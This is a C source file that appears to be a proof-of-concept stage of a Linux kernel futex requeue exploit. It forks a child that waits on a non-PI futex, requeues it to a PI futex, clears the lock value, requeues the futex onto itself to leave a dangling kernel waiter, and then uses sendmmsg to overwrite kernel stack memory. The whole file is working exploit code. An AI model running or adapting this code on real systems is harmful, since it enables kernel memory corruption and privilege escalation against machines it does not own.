#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <netinet/ip.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include "futex.h"
#include "errexit.h"

int main()
{
    int sockfd;
    int *futexes;
    int *non_pi_futex, *pi_futex;
    void *forged_waiter;

    struct sockaddr_in addr;
    struct mmsghdr msgvec[1];
    struct iovec msg[8];

    char buf[0x80] = {0};

    msgvec->msg_hdr.msg_name = buf;
    msgvec->msg_hdr.msg_namelen = sizeof(buf);
    msgvec->msg_hdr.msg_iov = msg;
    msgvec->msg_hdr.msg_iovlen = sizeof(msg) / sizeof(msg[0]);
    msgvec->msg_hdr.msg_control = NULL;
    msgvec->msg_hdr.msg_controllen = 0;
    msgvec->msg_hdr.msg_flags = 0;
    msgvec->msg_len = 0;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1)
        errExit("socket");

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(1234);
    if (connect(sockfd, &addr, sizeof(addr)) == -1)
        errExit("connect");

    futexes = mmap(NULL, sizeof(int) * 2, PROT_READ | PROT_WRITE,
                   MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (futexes == MAP_FAILED)
        errExit("mmap");

    non_pi_futex = &futexes[0];
    pi_futex = &futexes[1];

    flock(pi_futex);

    int pid = fork();
    if (pid == -1)
        errExit("fork");
    if (pid == 0)
    {
        fwait_requeue(non_pi_futex, pi_futex, 0);
        puts("Child continues.");
        if (sendmmsg(sockfd, msgvec, 1, 0) == -1)
            errExit("sendmmsg");
        exit(EXIT_SUCCESS);
    }

    frequeue(non_pi_futex, pi_futex, 1, 0);
    *pi_futex = 0;
    frequeue(pi_futex, pi_futex, 1, 0);

    wait(NULL);
}
